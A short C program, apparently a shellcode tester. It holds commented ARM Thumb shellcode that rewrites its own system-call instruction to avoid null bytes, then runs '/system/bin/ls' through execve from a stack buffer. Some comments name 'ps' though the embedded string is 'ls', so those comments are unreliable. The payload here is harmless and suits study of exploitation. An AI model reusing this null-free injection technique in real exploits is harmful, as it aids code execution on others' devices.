#include <stdio.h>
#include <string.h>

char shellcode[] = { 
  '\x5b', '\x40',     // eor r3, r3            // r3 = 0
  '\xff', '\x27',     // movs r7, #255         // r7 = 0xff
  '\x0c', '\xa1',     // add r1, pc, #48
  '\x0b', '\x60',     // str r3, [r1]
  '\x04', '\xa1',     // add  r1, pc, #16      // adress of svc 0xcc opcode
  '\x0a', '\x68',     // ldr  r2, [r1, #0]     // load opcode
  '\xba', '\x43',     // bics r2, r7           // clear last byte (0xcc becomes 0x00)
  '\x0a', '\x60',     // str  r2, [r1, #0]     // store modified opcode
  '\x03', '\xa1',     // add r1, pc, #12       // r1 = sh
  '\x4b', '\x60',     // str r3, [r1, #4]      // sh[1] = 0
  '\x04', '\xa0',     // add r0, pc, #16       // r0 = "system/bin/ps"
  '\x08', '\x60',     // str r0, [r1]          // sh[0] = "system/bin/ps"
  '\x1a', '\x1c',     // mov r2, r3            // r2 = 0
  '\x0b', '\x27',     // mov r7, #11           // r7 = 11 (execve)
  '\xcc', '\xdf',     // svc 0xcc              // interrupt 0x00; 0xcc is modified earlier to 0x00
  '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc',           // uninitialized table sh, additional 2 bytes due to allignment
  '/', '/', '/', 's', 'y', 's', 't', 'e', 'm', '/', 'b', 'i', 'n', '/', 'l', 's',                 // command string
  '\xdd', '\xdd', '\xdd', '\xdd', '\x00'
};

void main() 
{
  char c[1000];
  strcpy(c, shellcode);
  ((void (*)())(c+1))();
}

